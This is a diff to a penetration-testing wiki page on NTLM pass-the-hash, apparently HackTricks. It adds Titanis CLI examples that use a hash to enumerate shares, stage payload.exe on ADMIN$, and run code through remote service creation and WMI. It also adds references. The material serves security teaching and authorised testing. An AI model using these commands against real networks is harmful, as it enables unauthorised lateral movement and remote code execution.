@@ -215,6 +215,31 @@ You can download[ impacket binaries for Windows here](https://github.com/ropnop/
 - **atexec.exe** (In this case you need to specify a command, cmd.exe and powershell.exe are not valid to obtain an interactive shell)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
 - There are several more Impacket binaries...
 
+### Titanis CLI (Pass-the-Hash over SMB2/WMI/SCMR)
+
+Titanis provides cross‑platform clients that accept an NTLM hash directly. Examples:
+
+```bash
+# List shares over SRVS RPC (SMB2 transport) using NTLM hash
+Smb2Client enumshares TARGET -u User -ud DOMAIN -NtlmHash 8846F7EAEE8FB117AD06BDD830B7586C
+
+# Stage a file over SMB2 with signing
+Smb2Client put \\TARGET\ADMIN$\Temp\payload.exe ./payload.exe -u User -ud DOMAIN -NtlmHash 8846F7EAEE8FB117AD06BDD830B7586C -signreq
+
+# Execute via SCMR (remote service creation)
+Scm create TARGET -u User -ud DOMAIN -NtlmHash 8846F7EAEE8FB117AD06BDD830B7586C -EncryptRpc HTSvc C:\\Windows\\Temp\\payload.exe -Start
+
+# Fileless service command
+Scm create TARGET -u User -ud DOMAIN -NtlmHash 8846F7EAEE8FB117AD06BDD830B7586C -EncryptRpc HTSvc "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" -Start
+
+# Execute via WMI (Win32_Process.Create)
+Wmi exec TARGET -u User -ud DOMAIN -NtlmHash 8846F7EAEE8FB117AD06BDD830B7586C "whoami /all"
+```
+
+Notes
+- Use -signreq to require SMB signing and -EncryptSmb for full SMB encryption where supported.
+- -EncryptRpc enables packet privacy on MSRPC/DCOM calls.
+
 ### Invoke-TheHash
 
 You can get the powershell scripts from here: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)
@@ -345,5 +370,7 @@ krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
 ## References
 * [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
 * [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
+* [Titanis repository](https://github.com/trustedsec/Titanis)
+* [Titanis tools index](https://github.com/trustedsec/Titanis/blob/public/doc/UserGuide/tools/index.md)
 
 {{#include ../../banners/hacktricks-training.md}}
